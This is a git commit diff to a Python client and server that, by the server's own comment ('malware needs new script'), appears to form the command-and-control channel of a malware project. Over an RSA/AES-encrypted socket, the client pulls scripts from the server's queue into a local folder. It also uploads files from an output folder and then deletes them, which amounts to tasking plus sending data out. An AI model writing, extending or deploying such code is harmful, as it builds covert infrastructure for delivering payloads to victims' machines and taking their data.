698ed51fb3be2b36daa685ef70b34097f9f54029
Lidor <lidorshohat@gmail.com>
2023-04-16 19:48:08 +0300

    client sends output(except default)

--- communication/client side/client.py
+++ communication/client side/client.py
@@ -1,52 +1,97 @@
+import os
 import socket
+import time
+
 import rsa
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 import tqdm
 
 
-def encrypt(data, encryption_key):
-    cipher = AES.new(encryption_key, AES.MODE_EAX)
+def encrypt(data, key):
+    cipher = AES.new(key, AES.MODE_EAX)
     return cipher.nonce + cipher.encrypt(data)
 
 
-def decrypt(data, encryption_key):
-    cipher = AES.new(encryption_key, AES.MODE_EAX, nonce=data[0:16])
+def decrypt(data, key):
+    cipher = AES.new(key, AES.MODE_EAX, nonce=data[0:16])
     return cipher.decrypt(data[16:])
 
 
-if __name__ == '__main__':
-    server_ip = '127.0.0.1'
+def initiate(server_ip, port):
     client_socket = socket.socket()
-    client_socket.connect((server_ip, 786))
+    client_socket.connect((server_ip, port))
     print('connection initiated')
-    keep_alive = True
     n, e = client_socket.recv(1024).decode().split(':')
     n = int(n)
     e = int(e)
     temp_key = rsa.PublicKey(n, e)
     encryption_key = get_random_bytes(32)
     client_socket.send(rsa.encrypt(encryption_key, temp_key))
-    while (keep_alive):
-        data = decrypt(client_socket.recv(1024), encryption_key).decode()
-        print(data)
-        if data != '<nofile>':
-            filename, filesize = data.split(':')
-            filesize = int(filesize)
+    return client_socket, encryption_key
 
-            progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1008)
-            with open(filename, "wb") as f:
-                while True:
-                    # read 1024 bytes from the socket (receive)
-                    bytes_read = client_socket.recv(1024)
-                    if not bytes_read:
-                        # nothing is received
-                        # file transmitting is done
-                        break
-                    # write to the file the bytes we just received
-                    bytes_read = decrypt(bytes_read, encryption_key)
-                    f.write(bytes_read)
-                    # update the progress bar
-                    progress.update(len(bytes_read))
+
+if __name__ == '__main__':
+    server_ip = '127.0.0.1'
+    keep_alive = True
+    is_script = True
+    while (keep_alive):
+        client_socket, encryption_key = initiate(server_ip, 786)
+        print('connected')
+        if (os.listdir('./output')):
+            filename = os.listdir('./output')[0]
+            if (filename == 'default.txt'):
+                pass
+            else:
+                client_socket.send(encrypt('<newoutput>'.encode(), encryption_key))
+                time.sleep(0.1)
+                filesize = os.path.getsize('./output/' + filename)
+                client_socket.send(encrypt(f'{filename}:{filesize}'.encode(), encryption_key))
+
+                progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True,
+                                     unit_divisor=1008)
+                with open('./output/' + filename, "rb") as f:
+                    while True:
+                        # read the bytes from the file
+                        bytes_read = f.read(1008)
+                        if not bytes_read:
+                            # file transmitting is done
+                            client_socket.close()
+                            break
+                        client_socket.send(encrypt(bytes_read, encryption_key))
+                        # update the progress bar
+                        progress.update(len(bytes_read))
+                os.remove('./output/' + filename)
+
+        elif (not os.listdir('./script') and is_script):
+            print('need new script')
+            client_socket.send(encrypt('<newscript>'.encode(), encryption_key))
+            data = decrypt(client_socket.recv(1024), encryption_key).decode()
+            print(data)
+            if data != '<nofile>':
+                filename, filesize = data.split(':')
+                filesize = int(filesize)
+
+                progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True,
+                                     unit_divisor=1008)
+                with open('./script/' + filename, "wb") as f:
+                    while True:
+                        # read 1024 bytes from the socket (receive)
+                        bytes_read = client_socket.recv(1024)
+                        if not bytes_read:
+                            # nothing is received
+                            # file transmitting is done
+                            client_socket.close()
+                            break
+                        # write to the file the bytes we just received
+                        bytes_read = decrypt(bytes_read, encryption_key)
+                        f.write(bytes_read)
+                        # update the progress bar
+                        progress.update(len(bytes_read))
+            else:
+                is_script = False
+        else:
+            client_socket.send(encrypt('update'.encode(), encryption_key))
+            keep_alive = False
         client_socket.close()
-        keep_alive = False
+        print('done')
--- communication/server side/server.py
+++ communication/server side/server.py
@@ -24,10 +24,12 @@ if __name__ == '__main__':
         client_socket, client_ip = server_socket.accept()
         (public_key, private_key) = rsa.newkeys(1024)
         client_socket.send((str(public_key.n) + ':' + str(public_key.e)).encode())
-        encryption_key = rsa.decrypt(client_socket.recv(1024), private_key)
-
-        keep_alive = True
-        while (keep_alive):
+        data = client_socket.recv(1024)
+        encryption_key = rsa.decrypt(data, private_key)
+        request = decrypt(client_socket.recv(1024), encryption_key).decode()
+        print(request)
+        # malware needs new script
+        if (request == '<newscript>'):
             scripts = os.listdir('./queue')
             filename = ''
             while (filename == '' and scripts):
@@ -42,23 +44,43 @@ if __name__ == '__main__':
                 filesize = os.path.getsize('./queue/' + filename)
                 client_socket.send(encrypt(f'{filename}:{filesize}'.encode(), encryption_key))
 
-                progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True,unit_divisor=1008)
+                progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True,
+                                     unit_divisor=1008)
                 with open('./queue/' + filename, "rb") as f:
                     while True:
                         # read the bytes from the file
                         bytes_read = f.read(1008)
                         if not bytes_read:
                             # file transmitting is done
-                            os.remove('./queue/' + filename)
                             keep_alive = False
                             break
-                        # we use sendall to assure transimission in
-                        # busy networks
                         client_socket.send(encrypt(bytes_read, encryption_key))
                         # update the progress bar
                         progress.update(len(bytes_read))
+                os.remove('./queue/' + filename)
 
             else:
+                print('no scripts')
                 client_socket.send(encrypt('<nofile>'.encode(), encryption_key))
-                keep_alive = False
+        elif (request == '<newoutput>'):
+            data = decrypt(client_socket.recv(1024), encryption_key).decode()
+            print(data)
+            filename, filesize = data.split(':')
+            filesize = int(filesize)
+
+            progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True,
+                                 unit_divisor=1008)
+            with open('./output/' + filename, "wb") as f:
+                while True:
+                    # read 1024 bytes from the socket (receive)
+                    bytes_read = client_socket.recv(1024)
+                    if not bytes_read:
+                        # nothing is received
+                        # file transmitting is done
+                        break
+                    # write to the file the bytes we just received
+                    bytes_read = decrypt(bytes_read, encryption_key)
+                    f.write(bytes_read)
+                    # update the progress bar
+                    progress.update(len(bytes_read))
         client_socket.close()
